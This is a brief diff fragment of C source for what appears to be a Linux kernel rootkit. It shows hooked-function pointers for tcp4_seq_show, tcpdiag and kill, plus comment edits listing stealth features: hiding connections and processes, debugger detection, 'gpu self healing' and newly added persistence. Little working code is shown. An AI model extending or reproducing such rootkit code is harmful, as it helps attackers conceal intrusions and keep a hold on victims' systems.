@@ -36,9 +36,10 @@ static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
 static asmlinkage int (*orig_tcpdiag_send)(int fd, int protocol,struct filter *f);
 static asmlinkage int (*orig_kill)(const struct pt_regs *);
 //hide network connections/ports(hide for ss now)
-//hide processes
+//hide processes(works for 1 process)
 //gpu self healing
 //debugger detection
+//persistence
 
 static asmlinkage int hook_kill(const struct pt_regs *regs){
 
